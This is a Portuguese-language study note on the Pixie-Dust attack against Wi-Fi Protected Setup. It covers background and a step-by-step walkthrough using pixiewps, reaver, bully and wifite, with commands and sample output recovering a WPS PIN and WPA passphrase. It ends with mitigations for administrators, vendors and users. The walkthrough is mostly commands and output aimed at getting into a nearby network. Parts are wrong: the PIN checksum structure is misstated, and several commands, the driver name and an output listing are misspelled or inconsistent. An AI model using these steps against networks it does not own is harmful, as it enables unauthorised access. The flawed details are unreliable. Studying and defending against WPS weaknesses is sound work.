2025-09-06 18:17

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Redes de Computadores]] | [[Redes]] | [[Pixie-Dust]] | [[Wi-Fi]]

----
# Introdução

O **ataque Pixie-Dust** é uma exploração de segurança que visa vulnerabilidades em implementações do protocolo *Wi-Fi Protected Setup* (WPS). Este ataque explora falhas no mecanismo de autenticação PIN do WPS para recuperar a chave da rede Wi-Fi (PSK - *Pre-Share Key*) de forma offline, sem necessidade de interação constante com ponto de acesso.

O nome "Pixie-Dust"  deriva da ferramenta original que popularizou esta técnica, desenvolvida por Dominique Bongard em 2014, que demonstrou como explorar falhas na geração de números aleatórios (entropia insuficiente) em vários modelos de roteadores.

---
# Fundamentos do WPS e sua Vulnerabilidade

## O que é WPS?

*Wi-Fi Protected Setup* é um protocolo padrão criado para simplificar a conexão de dispositivos a redes Wi-Fi seguras. Oferece vários métodos de configuração, sendo o mais comum o **método PIN**, onde um código de 8 dígitos é usado para autenticar dispositivos.

## A vulnerabilidade do PIN WPS

O PIN WPS é dividido em duas partes:

- **Primeiros 4 dígitos:** Checksum dos últimos 4 dígitos.
- **Últimos 4 dígitos:** Valor principal.

O protocolo autentica o PIN em duas etapas separadas (4 + 4 dígitos), reduzindo drasticamente a complexidade:

- Complexidade teórica: 10⁸ = 100.000.000 combinações.
- Complexidade prática: 10⁴ + 10³ = 11.000 combinações (devido à verificação em etapas).

Além disso, muitos fabricantes implementaram **geração inadequada de valores aleatórios** durante o handshake EAP, tornando possível quebrar o PIN em questão de horas ou até minutos.

---
# Mecanismo do Ataque Pixie-Dust

## Fluxo do Ataque

1. **Reconhecimento:** Identificar um ponto de acesso com WPS ativado.
2. **Capturar:** Coletar os pacotes do handshake WPS (EAP).
3. **Extração:** Isolar os valores críticos (PKE, PKR, E-Hash1, E-Hash2, etc.).
4. **Processamento Offline:** Usar os valores capturados para calcular o PIN WPS.
5. **Exploração:** Usar o PIN recuperado para obter a chave PSK da rede.

Isso permite que os valores capturados sejam usados para reconstruir o estado interno do gerador de números aleatórios do roteado.

---
# Ferramentas para Executar o Ataque

## PixieWPS (sucessor da ferramenta original)

- **Linguagem:** C++
- **Funcionalidades:** Implementa melhorias no algoritmo de quebra.
- **Comandos básico:**

```bash
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>
```

## Reaver (com patch pixie-dust)

- **Versão modificada** para incluir o ataque Pixie-Dust
- **Comando:**

```bash
reaver -i <interface> -b <BSSID> -c <channel> -K 1
```

## Bully

- **Alternativa ao Reaver** com implementação Pixie-Dust
- **Comando:**

```bash
bully -b <BSSID> -d -v 3 <interface>
```

## Wifite2

- **Framework automatizado** que incorpora técnicas Pixie-Dust
- **Comando:**

```bash
wifite --wps --pixie
```

---
# Exemplo Prático de Uso

## Pré-requisitos

- Interface wireless compatível com modo monitor (ex.: Atheros AR9271)
- Drivers adequados (ex.: `ath96_htc`)
- Ferramentas instaladas: `pixiewps`, `reaver-wps-for-t6x`

## Processos Passo a Passo

### Passo 1: Configurar interface em modo monitor

```bash
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconig wlan0 up
```

**Saída esperada:**

```text
Killing processes that could cause trouble...
 
Interface   Driver      Chipset
wlan0       ath9k_htc   Atheros Communications AR9271
```

### Passo2 : Identificar redes WPS disponíveis

```bash
sudo wash -i wlan0
```

**Saída esperada:**

```text
BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID
-----------------------------------------------------------------
AA:BB:CC:DD:EE:FF  6        -72  1.0          No          MinhaRedeWiFi
11:22:33:44:55:66  11       -81  1.0          Yes         VizinhoSeguro
```

### Passo 3: Executar ataque Pixie-Dust com Bully

```bash
sudo bully -b AA:BB:CC:DD:EE:FF wlan0 -d -v 3
```

**Saída esperada:**

```
[+] [2024-01-15 14:30:22] Bully v1.4-00 - WPS PIN brute force attack
[+] [2024-01-15 14:30:22] Scanning for beacon from AA:BB:CC:DD:EE:FF
[+] [2024-01-15 14:30:23] Beacon heard, channel 6, signal -72
[+] [2024-01-15 14:30:23] Loaded 0 PINs from db/default.pin
[+] [2024-01-15 14:30:23] Using 'pixiedust' attack
[+] [2024-01-15 14:30:23] Starting session with AA:BB:CC:DD:EE:FF
[+] [2024-01-15 14:30:23] Sending M1 message
[+] [2024-01-15 14:30:23] Received M2 message
[+] [2024-01-15 14:30:23] Captured E-S1 and E-S2
[+] [2024-01-15 14:30:23] Running pixiewps with captured data
[!] [2024-01-15 14:30:24] Pixiewps execution: 
[+] [2024-01-15 14:30:24] Pixiewps 1.4.2 - WPS PIN attack tool
[+] [2024-01-15 14:30:24] [...] Computing PIN...
[+] [2024-01-15 14:30:24] [!] WPS PIN: '12345670'
[+] [2024-01-15 14:30:24] [!] WPA PSK: 'MinhaSenhaSecreta123'
[+] [2024-01-15 14:30:24] [+] AP SSID: 'MinhaRedeWiFi'
[+] [2024-01-15 14:30:24] Successfully recovered PIN and PSK
```

### Passo 4: Alternativa usando Reaver

```bash
sudo reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
```

**Saída esperada:**

```text
[+] Waiting for beacon from AA:BB:CC:DD:EE:FF
[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: MinhaRedeWiFi)
[+] Trying pixie-dust attack
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Running pixiewps -e [PKE] -r [PKR] -s [E-Hash1] -z [E-Hash2] -a [AuthKey] -n [E-Nonce]
[+] Pixiewps executed successfully
[+] WPS PIN: '12345670'
[+] WPA PSK: 'MinhaSenhaSecreta123'
[+] AP SSID: 'MinhaRedeWiFi'
[+] Pixie-dust attack successful!
```

### Passo 5: Usando o PIN recuperado para conectar à rede

```bash
# Usando wpa_supplicante para conectar
wpa_suppplicant -i wlan0 -c <(wpa_passphrase "MinhaRedeWiFi" "MinhaSenhaSecreta123")
```

**Saída Esperada:**

```text
Successfully initialized wpa_supplicant
Trying to associate with AA:BB:CC:DD:EE:FF (SSID='MinhaRedeWiFi' freq=2437 MHz)
Associated with AA:BB:CC:DD:EE:FF
WPA: Key negotiation completed with AA:BB:CC:DD:EE:FF [PTK=CCMP GTK=CCMP]
CTRL-EVENT-CONNECTED - Connection to AA:BB:CC:DD:EE:FF completed [id=0 id_str=]
```

### Passo 6: Verificar conexão

```bash
iwcofing wlan0
```

**Saída esperada:**

```text
wlan0     IEEE 802.11  ESSID:"MinhaRedeWiFi"  
          Mode:Managed  Frequency:2.437 GHz  Access Point: AA:BB:CC:DD:EE:FF   
          Bit Rate=65 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
          Link Quality=70/70  Signal level=-32 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
```


## Análise de Resultados

Em caso de sucesso, a ferramenta exibirá:

- PIN WPS recuperado.
- Chave PSK (senha da rede Wi-Fi).
- Tempo decorrido do processo.

---
# Vantagens do Ataque Pixie-Dust

## Velocidade

- **Tempo significativamente reduzido:** De horas/dias para segundos/minutos.
- **Processamento offline:** Uma vez capturados os valores, o cracking é feito offline.

## Eficiência

- **Alta taxa de sucesso** contra roteadores vulneráveis.
- **Baixo consumo de recursos** comparado a ataques de força bruta.

## Discrição

- **Menos tráfego visível:** Não gera múltiplas tentativas de PIN.
- **Menor chance de detecção** por sistemas de segurança.

---
# Limitações e Desvantagens

## Dependência de Implementação

- **Só funciona** em roteadores com entropia insuficiente.
- **Fabricantes corrigiram** a vulnerabilidade em modelos mais recentes.

## Requisitos específicos

- **Necessidade de proximidade** com o alvo.
- **Interface wireless compatível** necessária.

## Contra-medidas

- **Desativar WPS** no retoeador elimina a vulnerabilidade.
- **Sistema de detecção** modernos podem identificar tentativas de exploração.

---
# Mitigações e Proteções

## Para administradores de Rede

- **Desativar WPS** na interface de administração do roteador.
- **Atualizar firmware** para versões que corrigem a vulnerabilidade.
- **Implemnetar WPA2-Enterprise** ou WPA3 para maior segurança.

## Para desenvolvedores de dispostivos

- **Usar geradores criptográficos** adequados de número aleatórios.
- **Implementar rate-limiting** para tentativas de PIN WPS.
- **Desconsiderar WPS** em novos projetos.

## Para usuários finais

- **Verificar configurações** do roteador periodicamente.
- **Escolher roteadores** de fabricantes com histórico de segurança.
- **Monitorar dispositivos** conectados à rede.

---
# Conclusão

O ataque Pixie-Dust representa um marco importante na história da segurança Wi-Fi, demonstrando como implementações aparentemente insignificantes (como geração de números aleatórios) podem comprometer completamente sistemas de segurança. Embora mitigado em equipamentos modernos, serve como alerta para:

- Fabricantes sobre a importância da implementação correta de primitivas criptográficas
- Administradores sobre a necessidade de manter equipamentos atualizados
- Profissionais de segurança sobre a evolução constante das técnicas ofensivas

A compreensão detalhada deste ataque é essencial para profissionais de segurança cibernética e administradores de rede responsáveis pela proteção de infraestruturas wireless.